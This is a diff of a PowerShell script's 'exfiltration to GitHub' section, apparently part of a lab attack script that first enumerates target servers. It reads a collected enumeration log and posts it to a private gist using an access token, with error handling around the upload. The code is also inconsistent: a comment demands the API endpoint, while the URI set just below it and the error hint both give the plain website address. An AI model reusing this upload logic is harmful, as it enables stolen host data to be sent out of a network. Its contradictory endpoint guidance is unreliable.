@@ -52,32 +52,40 @@ foreach ($server in $targets) {
 }
 
 # --- 4. EXFILTRATION TO GITHUB ---
-$githubToken = 'ghp_your_token_here' # <-- Check this is correct
+$githubToken = 'ghp_your_actual_token_here' # <-- Make sure this is your REAL token
 
-# Correct API Endpoint for Gists
+# MANDATORY: This must be the API endpoint, not the website
 $apiUri = "https://github.com" 
 
-$logContent = Get-Content -Path "C:\Users\Public\enum.txt" -Raw
-
-$payload = @{
-    description = "Lab Results from $(hostname)"
-    public      = $false
-    files       = @{
-        "enum.txt" = @{ content = $logContent }
-    }
-} | ConvertTo-Json
-
-try {
-    $response = Invoke-RestMethod -Uri $apiUri `
-                                  -Method Post `
-                                  -Headers @{Authorization = "token $githubToken"} `
-                                  -Body $payload `
-                                  -ContentType "application/json"
+if (Test-Path $logPath) {
+    $logContent = Get-Content -Path $logPath -Raw
     
-    Write-Host "[+] Success! Gist created at: $($response.html_url)" -ForegroundColor Green
-}
-catch {
-    # This will print the actual error if it fails again
-    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
-}
+    $payload = @{
+        description = "Lab Results from $(hostname)"
+        public      = $false
+        files       = @{
+            "enum.txt" = @{ content = $logContent }
+        }
+    } | ConvertTo-Json
 
+    Write-Host "`n[!] Sending logs to GitHub API..." -ForegroundColor Cyan
+    try {
+        # Use -ErrorAction Stop to ensure the catch block catches the failure
+        $response = Invoke-RestMethod -Uri $apiUri `
+                                      -Method Post `
+                                      -Headers @{Authorization = "token $githubToken"} `
+                                      -Body $payload `
+                                      -ContentType "application/json" `
+                                      -ErrorAction Stop
+        
+        Write-Host "[+] Success! Gist created at: $($response.html_url)" -ForegroundColor Green
+    }
+    catch {
+        # This catches the error and prevents the giant HTML dump
+        Write-Host "[-] Exfiltration Failed!" -ForegroundColor Red
+        Write-Host "[-] Reason: $($_.Exception.Response.StatusCode) - $($_.Exception.Message)" -ForegroundColor Yellow
+        Write-Host "[-] Ensure your URL is https://github.com" -ForegroundColor Gray
+    }
+} else {
+    Write-Warning "Log file $logPath not found. Nothing to exfiltrate."
+}
